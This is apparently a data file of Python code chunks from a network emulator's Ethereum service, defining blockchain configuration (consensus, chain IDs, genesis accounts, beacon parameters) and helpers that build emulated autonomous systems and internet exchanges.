@param balance The balance to allocate.\n        @param unit The unit of Ethereum.\n\n        @returns Self, for chaining calls.\n        \"\"\"\n        balance = balance * unit.value\n        self.__genesis.addLocalAccount(address, balance)\n        \n        return self\n\n    def addLocalAccountsFromMnemonic(self, mnemonic:str, total:int, balance:int, unit:EthUnit=EthUnit.ETHER) -> Blockchain:\n        \"\"\"!\n        @brief Add local account from the given Mnemonic in addition to default local accounts.\n\n        @param mnemonic The mnemonic phrase to generate accounts from.\n        @param total The total number of accounts to generate.\n        @param balance The balance to allocate to the generated accounts.\n\n        @returns Self, for chaining calls.\n        \"\"\"\n        balance = balance * unit.value\n        mnemonic_account = EthAccount.createLocalAccountsFromMnemonic(mnemonic = mnemonic, balance=balance, total=total)\n        self.__genesis.addAccounts(mnemonic_account)\n\n    def getChainName(self) -> str:\n        \"\"\"!\n        @brief Get the name of the blockchain.\n\n        @returns The name of this blockchain.\n        \"\"\"\n        return self.__chain_name\n\n    def getChainId(self) -> int:\n        \"\"\"!\n        @brief Get the chain Id of the blockchain.\n        \n        @returns The chain Id of this blockchain.\n        \"\"\"\n        return self.__chain_id\n\n    def setEmuAccountParameters(self, mnemonic:str, balance:int, total_per_node:int, unit:EthUnit=EthUnit.ETHER):\n        \"\"\"!\n        @brief Set mnemonic, balance, and total_per_node value to customize the account generation in this blockchain.\n\n        @param mnemonic The mnemonic phrase to generate the accounts per a node in this blockchain.\n        @param balance The balance to allocate to the generated accounts.\n        @param total_per_node The total number of the accounts to generate per a node in this blockchain.\n        @param unit The unit of Ethereum.\n\n        @returns Self, for chaining calls.\n        \"\"\"\n        self.__emu_mnemonic = mnemonic\n        self.__emu_account_balance = balance * unit.value\n        self.__total_accounts_per_node = total_per_node\n        return self\n\n    def getEmuAccountParameters(self):\n        \"\"\"!\n        @brief Get values of mnemonic, balance, and total_per_node value used for the account generation.\n        \n        returns The value of mnemonic, balance, and total_per_node.\n        \"\"\"\n        return self.__emu_mnemonic, self.__emu_account_balance, self.__total_accounts_per_node\n\n    def setLocalAccountParameters(self, mnemonic:str, balance:int, total:int, unit:EthUnit=EthUnit.ETHER):\n        \"\"\"!\n        @brief Set mnemonic, balance, and total_per_node value to customize the local account generation.\n\n        @param mnemonic The mnemonic phrase to generate the local accounts.\n        @param balance The balance to allocate to the generated accounts.\n        @param total The total number of the local accounts.\n        @param unit The unit of Ethereum.\n\n        @returns Self, for chaining calls.\n        \"\"\"\n        self.__local_mnemonic = mnemonic\n        self.__local_account_balance = balance * unit.value\n        self.__local_accounts_total = total\n        return self\n\n    def setTargetAggregatorPerCommittee(self, target_aggregator_per_committee:int):\n        \"\"\"!\n        @brief Set target aggregator per committee for Beacon chain.\n        \n        @param target_aggregator_per_committee The target value of the number of aggregator per committee to set.\n        \n        @returns Self, for chaining calls.\n        \"\"\"\n        self.__target_aggregater_per_committee = target_aggregator_per_committee\n        return self\n\n    def getTargetAggregatorPerCommittee(self):\n        \"\"\"!\n        @brief Get the value of target aggregator per committee for Beacon chain.\n        \n        @returns The value of target_aggregator_per_committee.\n        \"\"\"\n        return self.__target_aggregater_per_committee\n\n    def setTargetCommitteeSize(self, target_committee_size:int):\n        \"\"\"!\n        @brief Set target committee size for Beacon chain.\n\n        @param target_committee_size The target value of committee size to set.\n\n        @returns Self, for chaining calls.\n        \"\"\"\n        self.__target_committee_size = target_committee_size\n        return self\n\n    def getTargetCommitteeSize(self):\n        \"\"\"!\n        @brief Get the value of target committee size for Beacon Chain.\n\n        @returns The value of target_committee_size.\n        \"\"\"\n        return self.__target_committee_size\n\n    def _log(self, message: str) -> None:\n        \"\"\"!\n        @brief Log to stderr.\n\n        @returns None.\n        \"\"\"\n        print(\"==== Blockchain Sub Layer: {}\".format(message), file=stderr)",
  "class EthereumService(Service):\n    \"\"\"!\n    @brief The Ethereum network service.\n    This service allows one to run a private Ethereum network in the emulator.\n    \"\"\"\n\n    __blockchains: Dict[str, Blockchain]\n\n    __save_state: bool\n    __save_path: str\n    __override: bool\n    __blockchain_id: int\n    __serial: int\n\n    def __init__(self, saveState: bool = False, savePath: str = './eth-states', override:bool=False):\n        \"\"\"!\n        @brief The EthereumService class initializer.\n\n        @param saveState (optional) If true, the service will try to save state\n        of the block chain by saving the datadir of every node. Default to\n        false.\n        @param savePath (optional) The path to save containers' datadirs on the\n        host. Default to \"./eth-states\". \n        @param override (optional) If true, override the output folder if it already\n        exist. False by default.\n\n        @returns An instance of the EthereumService class.\n        \"\"\"\n        super().__init__()\n\n        self.__serial = 0\n        self.__save_state = saveState\n        self.__save_path = savePath\n        self.__override = override\n        self.__blockchains = {}\n        self.__blockchain_id = 1337\n\n    def getName(self):\n        return 'EthereumService'\n\n    def isSave(self):\n        return self.__save_state\n\n    def getSavePath(self):\n        return self.__save_path\n\n    def _doConfigure(self, node: Node, server: EthereumServer):\n        blockchain = server.getBlockchain()\n        blockchain._doConfigure(node, server)\n    \n    def configure(self, emulator: Emulator):\n        if self.__save_state:\n            self._createSharedFolder()\n        super().configure(emulator)\n        for blockchain in self.__blockchains.values():\n            blockchain.configure(emulator)\n        \n    def _createSharedFolder(self):\n        if path.exists(self.__save_path):\n            if self.__override:\n                self._log('eth_state folder \"{}\" already exist, overriding.'.format(self.__save_path))\n                i = 1\n                while True:\n                    rename_save_path = \"{}-{}\".format(self.__save_path, i)\n                    if not path.exists(rename_save_path):\n                        rename(self.__save_path, rename_save_path)\n                        break\n                    else:\n                        i = i+1\n            else:\n                self._log('eth_state folder \"{}\" already exist. Set \"override = True\" when calling compile() to override.'.format(self.__save_path))\n                exit(1)\n        mkdir(self.__save_path)\n        \n    def _doInstall(self, node: Node, server: EthereumServer):\n        self._log('installing eth on as{}/{}...'.format(node.getAsn(), node.getName()))\n\n        server.install(node, self)\n\n    def _createServer(self, blockchain: Blockchain = None) -> Server:\n        self.__serial += 1\n        assert blockchain != None, 'EthereumService::_createServer(): create server using Blockchain::createNode() not EthereumService::install()'.format()\n        consensus = blockchain.getConsensusMechanism()\n        if consensus == ConsensusMechanism.POA:\n            return PoAServer(self.__serial, blockchain)\n        if consensus == ConsensusMechanism.POW:\n            return PoWServer(self.__serial, blockchain)\n        if consensus == ConsensusMechanism.POS:\n            return PoSServer(self.__serial, blockchain)\n\n    def installByBlockchain(self, vnode: str, blockchain: Blockchain) -> EthereumServer:\n        \"\"\"!\n        @brief Install the service on a node identified by given name. \n                This API is called by Blockchain Class. \n\n        @param vnode The name of the virtual node. \n        @param blockchain The blockchain that the created node is belongs to.\n        \n        @returns EthereumServer.\n        \"\"\"\n        if vnode in self._pending_targets.keys(): return self._pending_targets[vnode]\n\n        s = self._createServer(blockchain)\n        self._pending_targets[vnode] = s\n\n        return self._pending_targets[vnode]\n\n    def createBlockchain(self, chainName:str, consensus: ConsensusMechanism, chainId: int = -1):\n        \"\"\"!\n        @brief Create an instance of Blockchain class which is a sub-layer of the EthereumService.\n\n        @param chainName The name of the Blockchain.\n        @param consensus The consensus mechanism of the blockchain.\n        @param chainId The chain id of the Blockchain.\n\n        @returns an instance of Blockchain class.\n        \"\"\"\n        \n        if chainId < 0 : \n            chainId = self.__blockchain_id\n            self.__blockchain_id += 1\n        blockchain = Blockchain(self, chainName, chainId, consensus)\n        self.__blockchains[chainName] = blockchain\n        return blockchain\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'EthereumService:\\n'\n\n        indent += 4\n\n        out += ' ' * indent\n        out += 'Boot Nodes:\\n'\n\n        indent += 4\n\n        for node in self.getBootNodes(ConsensusMechanism.POW):\n            out += ' ' * indent\n            out += 'POW-{}\\n'.format(node)\n\n        for node in self.getBootNodes(ConsensusMechanism.POA):\n            out += ' ' * indent\n            out += 'POA-{}\\n'.format(node)\n\n        return out",
  "def __init__(self, service:EthereumService, chainName: str, chainId: int, consensus:ConsensusMechanism):\n        \"\"\"!\n        @brief The Blockchain class initializer.\n\n        @param service The EthereumService that creates the Blockchain class instance.\n        @param chainName The name of the Blockchain to create.\n        @param chainid The chain id of the Blockchain to create.\n        @param consensus The consensus of the Blockchain to create (supports POA, POS, POW).\n\n        @returns An instance of The Blockchain class.\n        \"\"\"\n        self.__eth_service = service\n        self.__consensus = consensus\n        self.__chain_name = chainName\n        self.__genesis = Genesis(ConsensusMechanism.POA) if self.__consensus == ConsensusMechanism.POS else Genesis(self.__consensus)\n        self.__boot_node_addresses = []\n        self.__miner_node_address = []\n        self.__joined_accounts = []\n        self.__joined_signer_accounts = []\n        self.__validator_ids = []\n        self.__beacon_setup_node_address = ''\n        self.__pending_targets = []\n        self.__emu_mnemonic = \"great awesome fun seed security lab protect system network prevent attack future\"\n        self.__total_accounts_per_node = 1\n        self.__emu_account_balance = 32 * EthUnit.ETHER.value\n        self.__local_mnemonic = \"great amazing fun seed lab protect network system security prevent attack future\"\n        self.__local_accounts_total = 5\n        self.__local_account_balance = 10 * EthUnit.ETHER.value\n        self.__chain_id = chainId\n        self.__terminal_total_difficulty = 20\n        self.__target_aggregater_per_committee = 2\n        self.__target_committee_size = 3",
  "def _doConfigure(self, node:Node, server:EthereumServer):\n        self._log('configuring as{}/{} as an eth node...'.format(node.getAsn(), node.getName()))\n\n        ifaces = node.getInterfaces()\n        assert len(ifaces) > 0, 'EthereumService::_doConfigure(): node as{}/{} has not interfaces'.format()\n        addr = '{}:{}'.format(str(ifaces[0].getAddress()), server.getBootNodeHttpPort())\n        \n        if server.isBootNode():\n            self._log('adding as{}/{} as consensus-{} bootnode...'.format(node.getAsn(), node.getName(), self.__consensus.value))\n            self.__boot_node_addresses.append(addr)\n        \n        if self.__consensus == ConsensusMechanism.POS:\n            if server.isStartMiner():\n                self._log('adding as{}/{} as consensus-{} miner...'.format(node.getAsn(), node.getName(), self.__consensus.value))\n                self.__miner_node_address.append(str(ifaces[0].getAddress())) \n            if server.isBeaconSetupNode():\n                self.__beacon_setup_node_address = '{}:{}'.format(ifaces[0].getAddress(), server.getBeaconSetupHttpPort())\n\n        server._createAccounts(self)\n        \n        accounts = server._getAccounts()\n        if len(accounts) > 0:\n            if self.__consensus == ConsensusMechanism.POS and server.isValidatorAtRunning():\n                accounts[0].balance = 33 * EthUnit.ETHER.value\n            self.__joined_accounts.extend(accounts)\n            if self.__consensus in [ConsensusMechanism.POA, ConsensusMechanism.POS] and server.isStartMiner():\n                self.__joined_signer_accounts.append(accounts[0])\n\n        if self.__consensus == ConsensusMechanism.POS and server.isValidatorAtGenesis():\n            self.__validator_ids.append(str(server.getId()))\n        \n        server._generateGethStartCommand()\n\n        if self.__eth_service.isSave():\n            save_path = self.__eth_service.getSavePath()\n            node.addSharedFolder('/root/.ethereum', '../{}/{}/{}/ethereum'.format(save_path, self.__chain_name, server.getId()))\n            node.addSharedFolder('/root/.ethash', '../{}/{}/{}/ethash'.format(save_path, self.__chain_name, server.getId()))\n            makedirs('{}/{}/{}/ethereum'.format(save_path, self.__chain_name, server.getId()))\n            makedirs('{}/{}/{}/ethash'.format(save_path, self.__chain_name, server.getId()))",
  "def configure(self, emulator:Emulator):\n        pending_targets = self.__eth_service.getPendingTargets()\n        localAccounts = EthAccount.createLocalAccountsFromMnemonic(mnemonic=self.__local_mnemonic, balance=self.__local_account_balance, total=self.__local_accounts_total)\n        self.__genesis.addAccounts(localAccounts)\n        self.__genesis.setChainId(self.__chain_id)\n        for vnode in self.__pending_targets:\n            node = emulator.getBindingFor(vnode)\n            server = pending_targets[vnode]\n            if self.__consensus == ConsensusMechanism.POS and server.isStartMiner():\n                ifaces = node.getInterfaces()\n                assert len(ifaces) > 0, 'EthereumService::_doConfigure(): node as{}/{} has not interfaces'.format()\n                addr = str(ifaces[0].getAddress())\n                miner_ip = self.__miner_node_address[0]\n                if addr == miner_ip:\n                    validator_count = len(self.getValidatorIds())\n                    index = self.__joined_accounts.index(server._getAccounts()[0])\n                    self.__joined_accounts[index].balance = 32*pow(10,18)*(validator_count+2)\n        \n        self.__genesis.addAccounts(self.getAllAccounts())\n        \n        if self.__consensus in [ConsensusMechanism.POA, ConsensusMechanism.POS] :\n            self.__genesis.setSigner(self.getAllSignerAccounts())",
  "def getBootNodes(self) -> List[str]:\n        \"\"\"!\n        @brief Get bootnode IPs.\n\n        @returns List of bootnodes IP addresses.\n        \"\"\"\n        return self.__boot_node_addresses",
  "def getMinerNodes(self) -> List[str]:\n        \"\"\"!\n        @brief Get miner node IPs.\n\n        @returns List of miner nodes IP addresses.\n        \"\"\"\n        return self.__miner_node_address",
  "def getAllAccounts(self) -> List[AccountStructure]:\n        \"\"\"!\n        @brief Get a joined list of all the created accounts on all nodes in the blockchain.\n        \n        @returns List of accounts.\n        \"\"\"\n        return self.__joined_accounts",
  "def getAllSignerAccounts(self) -> List[AccountStructure]:\n        \"\"\"!\n        @brief Get a list of all signer accounts on all nodes in the blockchain.\n        \n        returns List of signer accounts.\n        \"\"\"\n        return self.__joined_signer_accounts",
  "def getValidatorIds(self) -> List[str]:\n        \"\"\"!\n        @brief Get a list of all validators ids on all nodes in the blockchain.\n        \n        @returns List of all validators ids.\n        \"\"\"\n        return self.__validator_ids",
  "def getBeaconSetupNodeIp(self) -> str:\n        \"\"\"!\n        @brief Get the IP of a beacon setup node.\n\n        @returns The IP address.\n        \"\"\"\n        return self.__beacon_setup_node_address",
  "def setGenesis(self, genesis:str) -> EthereumServer:\n        \"\"\"!\n        @brief Set the custom genesis.\n        \n        @param genesis The genesis file contents to set. \n\n        @returns Self, for chaining API calls.\n        \"\"\"\n        self.__genesis.setGenesis(genesis)\n\n        return self",
  "def getGenesis(self) -> Genesis:\n        \"\"\"!\n        @brief Get the genesis file content.\n\n        @returns Genesis. \n        \"\"\"\n        return self.__genesis",
  "def setConsensusMechanism(self, consensus:ConsensusMechanism) -> EthereumServer:\n        \"\"\"!\n        @brief Set consensus mechanism of this blockchain.\n\n        @param consensusMechanism Consensus mechanism to set (supports POW, POA and POS).\n\n        @returns Self, for chaining API calls. \n        \"\"\"\n        self.__consensus = consensus\n        self.__genesis = Genesis(self.__consensus)\n        \n        return self",
  "def getConsensusMechanism(self) -> ConsensusMechanism:\n        \"\"\"!\n        @brief Get the consensus mechanism of this blockchain.\n\n        @returns ConsensusMechanism\n        \"\"\"\n        return self.__consensus",
  "def setTerminalTotalDifficulty(self, ttd:int):\n        \"\"\"!\n        @brief Set the terminal total difficulty, which is the value to designate\n                when the Merge is happen. In POA, difficulty is tend to increase by 2\n                for every one block. For example, if the terminal_total_difficulty is \n                set to 20, the Ethereum blockchain will keep POA consensus for approximately\n                150 sec (20/2*15) and then stop signing the block until the Merge happens.\n                Default to 20. \n\n        @param ttd The terminal total difficulty to set.\n        \n        @returns Self, for chaining API calls.\n        \"\"\"\n        self.__terminal_total_difficulty = ttd\n\n        return self",
  "def getTerminalTotalDifficulty(self) -> int:\n        \"\"\"!\n        @brief Get the value of the terminal total difficulty.\n        \n        @returns terminal_total_difficulty.\n        \"\"\"\n\n        return self.__terminal_total_difficulty",
  "def setGasLimitPerBlock(self, gasLimit:int):\n        \"\"\"!\n        @brief Set GasLimit at Genesis (the limit of gas cost per block).\n\n        @param gasLimit The gas limit per block.\n        \n        @returns Self, for chaining API calls.\n        \"\"\"\n        self.__genesis.setGasLimit(gasLimit)\n        return self",
  "def setChainId(self, chainId:int):\n        \"\"\"!\n        @brief Set chain Id at Genesis.\n\n        @param chainId The chain Id to set.\n\n        @returns Self, for chaining API calls\n        \"\"\"\n\n        self.__chain_id = chainId\n        return self",
  "def createNode(self, vnode: str) -> EthereumServer:\n        \"\"\"!\n        @brief Create a node belongs to this blockchain.\n\n        @param vnode The name of vnode.\n\n        @returns EthereumServer\n        \"\"\"\n        eth = self.__eth_service\n        self.__pending_targets.append(vnode)\n        return eth.installByBlockchain(vnode, self)",
  "def addLocalAccount(self, address: str, balance: int, unit:EthUnit=EthUnit.ETHER) -> Blockchain:\n        \"\"\"!\n        @brief Allocate balance to an external account by setting alloc field of genesis file.\n\n        @param address The External account's address.\n        @param balance The balance to allocate.\n        @param unit The unit of Ethereum.\n\n        @returns Self, for chaining calls.\n        \"\"\"\n        balance = balance * unit.value\n        self.__genesis.addLocalAccount(address, balance)\n        \n        return self",
  "def addLocalAccountsFromMnemonic(self, mnemonic:str, total:int, balance:int, unit:EthUnit=EthUnit.ETHER) -> Blockchain:\n        \"\"\"!\n        @brief Add local account from the given Mnemonic in addition to default local accounts.\n\n        @param mnemonic The mnemonic phrase to generate accounts from.\n        @param total The total number of accounts to generate.\n        @param balance The balance to allocate to the generated accounts.\n\n        @returns Self, for chaining calls.\n        \"\"\"\n        balance = balance * unit.value\n        mnemonic_account = EthAccount.createLocalAccountsFromMnemonic(mnemonic = mnemonic, balance=balance, total=total)\n        self.__genesis.addAccounts(mnemonic_account)",
  "def getChainName(self) -> str:\n        \"\"\"!\n        @brief Get the name of the blockchain.\n\n        @returns The name of this blockchain.\n        \"\"\"\n        return self.__chain_name",
  "def getChainId(self) -> int:\n        \"\"\"!\n        @brief Get the chain Id of the blockchain.\n        \n        @returns The chain Id of this blockchain.\n        \"\"\"\n        return self.__chain_id",
  "def setEmuAccountParameters(self, mnemonic:str, balance:int, total_per_node:int, unit:EthUnit=EthUnit.ETHER):\n        \"\"\"!\n        @brief Set mnemonic, balance, and total_per_node value to customize the account generation in this blockchain.\n\n        @param mnemonic The mnemonic phrase to generate the accounts per a node in this blockchain.\n        @param balance The balance to allocate to the generated accounts.\n        @param total_per_node The total number of the accounts to generate per a node in this blockchain.\n        @param unit The unit of Ethereum.\n\n        @returns Self, for chaining calls.\n        \"\"\"\n        self.__emu_mnemonic = mnemonic\n        self.__emu_account_balance = balance * unit.value\n        self.__total_accounts_per_node = total_per_node\n        return self",
  "def getEmuAccountParameters(self):\n        \"\"\"!\n        @brief Get values of mnemonic, balance, and total_per_node value used for the account generation.\n        \n        returns The value of mnemonic, balance, and total_per_node.\n        \"\"\"\n        return self.__emu_mnemonic, self.__emu_account_balance, self.__total_accounts_per_node",
  "def setLocalAccountParameters(self, mnemonic:str, balance:int, total:int, unit:EthUnit=EthUnit.ETHER):\n        \"\"\"!\n        @brief Set mnemonic, balance, and total_per_node value to customize the local account generation.\n\n        @param mnemonic The mnemonic phrase to generate the local accounts.\n        @param balance The balance to allocate to the generated accounts.\n        @param total The total number of the local accounts.\n        @param unit The unit of Ethereum.\n\n        @returns Self, for chaining calls.\n        \"\"\"\n        self.__local_mnemonic = mnemonic\n        self.__local_account_balance = balance * unit.value\n        self.__local_accounts_total = total\n        return self",
  "def setTargetAggregatorPerCommittee(self, target_aggregator_per_committee:int):\n        \"\"\"!\n        @brief Set target aggregator per committee for Beacon chain.\n        \n        @param target_aggregator_per_committee The target value of the number of aggregator per committee to set.\n        \n        @returns Self, for chaining calls.\n        \"\"\"\n        self.__target_aggregater_per_committee = target_aggregator_per_committee\n        return self",
  "def getTargetAggregatorPerCommittee(self):\n        \"\"\"!\n        @brief Get the value of target aggregator per committee for Beacon chain.\n        \n        @returns The value of target_aggregator_per_committee.\n        \"\"\"\n        return self.__target_aggregater_per_committee",
  "def setTargetCommitteeSize(self, target_committee_size:int):\n        \"\"\"!\n        @brief Set target committee size for Beacon chain.\n\n        @param target_committee_size The target value of committee size to set.\n\n        @returns Self, for chaining calls.\n        \"\"\"\n        self.__target_committee_size = target_committee_size\n        return self",
  "def getTargetCommitteeSize(self):\n        \"\"\"!\n        @brief Get the value of target committee size for Beacon Chain.\n\n        @returns The value of target_committee_size.\n        \"\"\"\n        return self.__target_committee_size",
  "def _log(self, message: str) -> None:\n        \"\"\"!\n        @brief Log to stderr.\n\n        @returns None.\n        \"\"\"\n        print(\"==== Blockchain Sub Layer: {}\".format(message), file=stderr)",
  "def __init__(self, saveState: bool = False, savePath: str = './eth-states', override:bool=False):\n        \"\"\"!\n        @brief The EthereumService class initializer.\n\n        @param saveState (optional) If true, the service will try to save state\n        of the block chain by saving the datadir of every node. Default to\n        false.\n        @param savePath (optional) The path to save containers' datadirs on the\n        host. Default to \"./eth-states\". \n        @param override (optional) If true, override the output folder if it already\n        exist. False by default.\n\n        @returns An instance of the EthereumService class.\n        \"\"\"\n        super().__init__()\n\n        self.__serial = 0\n        self.__save_state = saveState\n        self.__save_path = savePath\n        self.__override = override\n        self.__blockchains = {}\n        self.__blockchain_id = 1337",
  "def getName(self):\n        return 'EthereumService'",
  "def isSave(self):\n        return self.__save_state",
  "def getSavePath(self):\n        return self.__save_path",
  "def _doConfigure(self, node: Node, server: EthereumServer):\n        blockchain = server.getBlockchain()\n        blockchain._doConfigure(node, server)",
  "def configure(self, emulator: Emulator):\n        if self.__save_state:\n            self._createSharedFolder()\n        super().configure(emulator)\n        for blockchain in self.__blockchains.values():\n            blockchain.configure(emulator)",
  "def _createSharedFolder(self):\n        if path.exists(self.__save_path):\n            if self.__override:\n                self._log('eth_state folder \"{}\" already exist, overriding.'.format(self.__save_path))\n                i = 1\n                while True:\n                    rename_save_path = \"{}-{}\".format(self.__save_path, i)\n                    if not path.exists(rename_save_path):\n                        rename(self.__save_path, rename_save_path)\n                        break\n                    else:\n                        i = i+1\n            else:\n                self._log('eth_state folder \"{}\" already exist. Set \"override = True\" when calling compile() to override.'.format(self.__save_path))\n                exit(1)\n        mkdir(self.__save_path)",
  "def _doInstall(self, node: Node, server: EthereumServer):\n        self._log('installing eth on as{}/{}...'.format(node.getAsn(), node.getName()))\n\n        server.install(node, self)",
  "def _createServer(self, blockchain: Blockchain = None) -> Server:\n        self.__serial += 1\n        assert blockchain != None, 'EthereumService::_createServer(): create server using Blockchain::createNode() not EthereumService::install()'.format()\n        consensus = blockchain.getConsensusMechanism()\n        if consensus == ConsensusMechanism.POA:\n            return PoAServer(self.__serial, blockchain)\n        if consensus == ConsensusMechanism.POW:\n            return PoWServer(self.__serial, blockchain)\n        if consensus == ConsensusMechanism.POS:\n            return PoSServer(self.__serial, blockchain)",
  "def installByBlockchain(self, vnode: str, blockchain: Blockchain) -> EthereumServer:\n        \"\"\"!\n        @brief Install the service on a node identified by given name. \n                This API is called by Blockchain Class. \n\n        @param vnode The name of the virtual node. \n        @param blockchain The blockchain that the created node is belongs to.\n        \n        @returns EthereumServer.\n        \"\"\"\n        if vnode in self._pending_targets.keys(): return self._pending_targets[vnode]\n\n        s = self._createServer(blockchain)\n        self._pending_targets[vnode] = s\n\n        return self._pending_targets[vnode]",
  "def createBlockchain(self, chainName:str, consensus: ConsensusMechanism, chainId: int = -1):\n        \"\"\"!\n        @brief Create an instance of Blockchain class which is a sub-layer of the EthereumService.\n\n        @param chainName The name of the Blockchain.\n        @param consensus The consensus mechanism of the blockchain.\n        @param chainId The chain id of the Blockchain.\n\n        @returns an instance of Blockchain class.\n        \"\"\"\n        \n        if chainId < 0 : \n            chainId = self.__blockchain_id\n            self.__blockchain_id += 1\n        blockchain = Blockchain(self, chainName, chainId, consensus)\n        self.__blockchains[chainName] = blockchain\n        return blockchain",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'EthereumService:\\n'\n\n        indent += 4\n\n        out += ' ' * indent\n        out += 'Boot Nodes:\\n'\n\n        indent += 4\n\n        for node in self.getBootNodes(ConsensusMechanism.POW):\n            out += ' ' * indent\n            out += 'POW-{}\\n'.format(node)\n\n        for node in self.getBootNodes(ConsensusMechanism.POA):\n            out += ' ' * indent\n            out += 'POA-{}\\n'.format(node)\n\n        return out",
  "class ConsensusMechanism(Enum):\n    \"\"\"!\n    @brief Consensus Mechanism Enum.\n    \"\"\"\n\n    # POA for Proof of Authority\n    POA = 'POA'\n    # POW for Proof of Work\n    POW = 'POW'\n    POS = 'POS'",
  "class Syncmode(Enum):\n    \"\"\"!\n    @brief geth syncmode Enum.\n    \"\"\"\n    SNAP = 'snap'\n    FULL = 'full'\n    LIGHT = 'light'",
  "class EthereumServerTypes(Enum):\n    \"\"\"!\n    @brief ethereum server type enum.\n    \"\"\"\n    ETH_NODE = 'eth_node'\n    BEACON_SETUP_NODE = 'beacon_setup_node'",
  "class EthUnit(Enum):\n    \"\"\"!\n    @brief ethereum unit type enum\n    \"\"\"\n    WEI = 1\n    GWEI = pow(10, 9)\n    ETHER = pow(10, 18)",
  "def makeTransitAs(base: Base, asn: int, exchanges: List[int],\n    intra_ix_links: List[Tuple[int, int]]) -> AutonomousSystem:\n    \"\"\"!\n    @brief create a transit AS.\n\n    @param base reference to the base layer.\n    @param asn ASN of the newly created AS.\n    @param exchanges list of IXP IDs to join.\n    @param intra_ix_links list of tuple of IXP IDs, to create intra-IX links at.\n\n    @returns transit AS object.\n    \"\"\"\n\n    transit_as = base.createAutonomousSystem(asn)\n\n    routers: Dict[int, Router] = {}\n\n    # Create a BGP router for each internet exchange (for peering purpose)\n    for ix in exchanges:\n        routers[ix] = transit_as.createRouter('r{}'.format(ix))\n        routers[ix].joinNetwork('ix{}'.format(ix))\n\n    # For each pair, create an internal network to connect the BGP routers\n    # from two internet exchanges. There is no need to create a full-mesh\n    # network among the BGP routers. As long as they can reach each other\n    # over a single or multiple hops, it is OK.\n    for (a, b) in intra_ix_links:\n        name = 'net_{}_{}'.format(a, b)\n\n        transit_as.createNetwork(name)\n        routers[a].joinNetwork(name)\n        routers[b].joinNetwork(name)\n\n    return transit_as",
  "def createHostsOnNetwork(emu: Emulator, the_as: AutonomousSystem, network: str, \n        services: List[Service], counter_start: int = 0):\n    \"\"\"!\n    @brief For each service, create a host for it.\n\n    @param emu reference to the Emulator object.\n    @param the_as reference to the AutonomousSystem object.\n    @param network name of network to join on hosts.\n    @param services list of instances of Service to install on hosts. One will\n    be installed on each.\n    @param counter_start (optional) counter to start when assigning names to\n    hosts. Default to 0.\n    \"\"\"\n\n    # For each service, create a host for it. \n    # service is the instance of a service class, such as WebService,\n    # If service is None, only create a host without installing any service.\n    counter = counter_start\n\n    if len(services) == 0:\n        name = 'host_{}'.format(counter)\n        the_as.createHost(name).joinNetwork(network)\n\n    for service in services:\n        if service is None:\n           name = 'host_{}'.format(counter)\n           the_as.createHost(name).joinNetwork(network)\n        else:\n           # Create a physical node\n           name = '{}_{}'.format(service.getName().lower(), counter)\n           the_as.createHost(name).joinNetwork(network)\n\n           # Install the service on a virtual node \n           asn = the_as.getAsn()\n           vnodename = 'as{}_{}_{}'.format(asn, name, counter)\n           service.install(vnodename)\n\n           # Bind the virtual node to the physical node\n           emu.addBinding(Binding(vnodename, filter = Filter(asn = asn, nodeName = name)))\n\n        counter += 1",
  "def makeStubAs(emu: Emulator, base: Base, asn: int, exchange: int,\n    services: List[Service]):\n    \"\"\"!\n    @brief create a new stub AS.\n\n    @param emu reference to the Emulator object.\n    @param base reference to the base layer.\n    @param asn ASN for the newly created AS.\n    @param exchange IXP ID for new newly created AS to join.\n    @param list of instances of Service to install on hosts. One host will be\n    created for each.\n    \"\"\"\n\n    # Create AS and internal network\n    stub_as = base.createAutonomousSystem(asn)\n    stub_as.createNetwork('net0')\n\n    # Create a BGP router \n    # Attach the router to both the internal and external networks\n    router = stub_as.createRouter('router0')\n    router.joinNetwork('net0')\n    router.joinNetwork('ix{}'.format(exchange))\n\n    # Create a host node for each specified service\n    createHostsOnNetwork(emu, stub_as, 'net0', services)",
  "def makeStubAsWithHosts(emu: Emulator, base: Base, asn: int, exchange: int, hosts_total: int):\n\n    # Create AS and internal network\n    network = \"net0\"\n    stub_as = base.createAutonomousSystem(asn)\n    stub_as.createNetwork(network)\n\n    # Create a BGP router\n    # Attach the router to both the internal and external networks\n    router = stub_as.createRouter('router0')\n    router.joinNetwork(network)\n    router.joinNetwork('ix{}'.format(exchange))\n\n    for counter in range(hosts_total):\n       name = 'host_{}'.format(counter)\n       host = stub_as.createHost(name)\n       host.joinNetwork(network)",
  "def makeEmulatorBaseWith10StubASAndHosts(hosts_per_stub_as: int) -> Emulator:\n    ###############################################################################\n    emu     = Emulator()\n    base    = Base()\n    routing = Routing()\n    ebgp    = Ebgp()\n    ibgp    = Ibgp()\n    ospf    = Ospf()\n\n\n    ###############################################################################\n\n    ix100 = base.createInternetExchange(100)\n    ix101 = base.createInternetExchange(101)\n    ix102 = base.createInternetExchange(102)\n    ix103 = base.createInternetExchange(103)\n    ix104 = base.createInternetExchange(104)\n\n    # Customize names (for visualization purpose)\n    ix100.getPeeringLan().setDisplayName('NYC-100')\n    ix101.getPeeringLan().setDisplayName('San Jose-101')\n    ix102.getPeeringLan().setDisplayName('Chicago-102')\n    ix103.getPeeringLan().setDisplayName('Miami-103')\n    ix104.getPeeringLan().setDisplayName('Boston-104')\n\n\n    ###############################################################################\n    # Create Transit Autonomous Systems \n\n    ## Tier 1 ASes\n    makeTransitAs(base, 2, [100, 101, 102], \n        [(100, 101), (101, 102)] \n    )\n\n    makeTransitAs(base, 3, [100, 103, 104], \n        [(100, 103), (103, 104)]\n    )\n\n    makeTransitAs(base, 4, [100, 102, 104], \n        [(100, 104), (102, 104)]\n    )\n\n    ## Tier 2 ASes\n    makeTransitAs(base, 12, [101, 104], [(101, 104)])\n\n\n    ###############################################################################\n    # Create single-homed stub ASes. \"None\" means create a host only \n\n    makeStubAsWithHosts(emu, base, 150, 100, hosts_per_stub_as)\n    makeStubAsWithHosts(emu, base, 151, 100, hosts_per_stub_as)\n    makeStubAsWithHosts(emu, base, 152, 101, hosts_per_stub_as)\n    makeStubAsWithHosts(emu, base, 153, 101, hosts_per_stub_as)\n    makeStubAsWithHosts(emu, base, 154, 102, hosts_per_stub_as)\n    makeStubAsWithHosts(emu, base, 160, 103, hosts_per_stub_as)\n    makeStubAsWithHosts(emu, base, 161, 103, hosts_per_stub_as)\n    makeStubAsWithHosts(emu, base, 162, 103, hosts_per_stub_as)\n    makeStubAsWithHosts(emu, base, 163, 104, hosts_per_stub_as)\n    makeStubAsWithHosts(emu, base, 164, 104, 